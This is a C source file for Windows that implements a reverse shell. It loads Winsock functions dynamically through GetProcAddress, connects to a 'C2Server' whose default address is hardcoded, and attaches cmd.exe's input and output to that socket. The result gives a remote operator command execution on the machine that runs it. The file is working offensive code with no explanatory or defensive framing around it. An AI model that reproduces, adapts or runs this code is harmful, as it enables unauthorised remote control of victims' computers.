#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>

// Function Defination via MinGW
typedef int (WSAAPI* WSASTARTUP)(WORD wVersionRequested,LPWSADATA lpWSAData);
typedef SOCKET (WSAAPI* WSASOCKETA)(int af,int type,int protocol,LPWSAPROTOCOL_INFOA lpProtocolInfo,GROUP g,DWORD dwFlags);
typedef unsigned __LONG32 (WSAAPI* INET_ADDR)(const char *cp);
typedef u_short (WSAAPI* HTONS)(u_short hostshort);
typedef int (WSAAPI* WSACONNECT)(SOCKET s,const struct sockaddr *name,int namelen,LPWSABUF lpCallerData,LPWSABUF lpCalleeData,LPQOS lpSQOS,LPQOS lpGQOS);
typedef int (WSAAPI* CLOSESOCKET)(SOCKET s);
typedef int (WSAAPI* WSACLEANUP)(void);


void RunShell(char* C2Server, int C2Port)
{
    // Loading the Ws2_32 Module
    HANDLE hws2 = LoadLibraryW(L"Ws2_32.dll");

    // Calling all the Function Pointer
    WSASTARTUP fnWSAStartup = (WSASTARTUP)GetProcAddress(hws2, "WSAStartup");
    WSASOCKETA fnWSASocketA = (WSASOCKETA)GetProcAddress(hws2, "WSASocketA");
    INET_ADDR fninet_addr = (INET_ADDR)GetProcAddress(hws2, "inet_addr");
    HTONS fnhtons = (HTONS)GetProcAddress(hws2, "htons");
    WSACONNECT fnWSAConnect = (WSACONNECT)GetProcAddress(hws2, "WSAConnect");
    CLOSESOCKET fnclosesocket = (CLOSESOCKET)GetProcAddress(hws2, "closesocket");
    WSACLEANUP fnWSACleanup = (WSACLEANUP)GetProcAddress(hws2, "WSACleanup");


    SOCKET Socket;
    struct sockaddr_in addr;
    WSADATA version;
    fnWSAStartup(MAKEWORD(2,2), &version);
    Socket = fnWSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
    addr.sin_family = AF_INET;

    addr.sin_addr.s_addr = fninet_addr(C2Server);
    addr.sin_port = fnhtons(C2Port);

    if (fnWSAConnect(Socket, (SOCKADDR*)&addr, sizeof(addr), 0, 0, 0,0) == SOCKET_ERROR)
    {
        fnclosesocket(Socket);
        fnWSACleanup();
    }
    else
    {
        printf("Connected to %s: %d \n", C2Server, C2Port);

        char Process[] = "cmd.exe";
        STARTUPINFO sinfo;
        PROCESS_INFORMATION pinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) Socket;
        CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

        printf("Process Created %lu \n", pinfo.dwProcessId);

        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
    }
}

int main(int argc, char **argv)
{
    if (argc == 3)
    {
        int port = atoi(argv[2]);

        RunShell(argv[1], port);
    }
    else
    {
        char host[] = "172.23.212.100";
        int port = 8081;
        RunShell(host, port);
    }

    return 0;
}